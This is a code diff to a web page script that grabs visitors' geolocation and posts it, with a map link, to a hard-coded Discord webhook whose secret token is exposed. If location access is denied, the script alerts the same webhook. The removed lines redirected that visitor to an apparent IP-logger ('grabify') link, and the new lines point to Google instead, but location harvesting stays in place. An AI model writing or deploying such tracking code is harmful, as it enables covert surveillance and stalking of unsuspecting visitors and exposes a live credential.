@@ -24,7 +24,7 @@
                         const webhookURL = "https://discord.com/api/webhooks/1310096225961250816/HuldPFlYUqeQHYOtEGYDkVxr2OC3DTQKt6gPPwRpjwkPdOUYRcRAFvsbOKPAFnIcYjYX";
                         
                         const data = {
-                            content: 📍 **New Location Shared!**\n🌍 Latitude: ${latitude}\n🌏 Longitude: ${longitude}\n[📌 View on Google Maps](https://www.google.com/maps?q=${latitude},${longitude})
+                            content: `📍 **New Location Shared!**\n🌍 Latitude: ${latitude}\n🌏 Longitude: ${longitude}\n[📌 View on Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`
                         };
 
                         fetch(webhookURL, {
@@ -43,9 +43,9 @@
                         fetch("https://discord.com/api/webhooks/1310096225961250816/HuldPFlYUqeQHYOtEGYDkVxr2OC3DTQKt6gPPwRpjwkPdOUYRcRAFvsbOKPAFnIcYjYX", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({ content: "🚨 **User denied location access sent user to grabify link!**" })
+                            body: JSON.stringify({ content: "🚨 **User denied location access!**" })
                         }).then(() => {
-                            window.location.href = "https://screenshot.best/film.php?2919=N048XR.html";
+                            window.location.href = "https://www.google.com";
                         });
                     }
                 );
@@ -58,7 +58,7 @@
             sendLocation();
         });
 
-        // Random comment: Why don’t mountains get tired? Because they peak cuz niooiii!
+        // Random comment: Why don’t mountains get tired? Because they peak!
     </script>
 </body>
 </html>
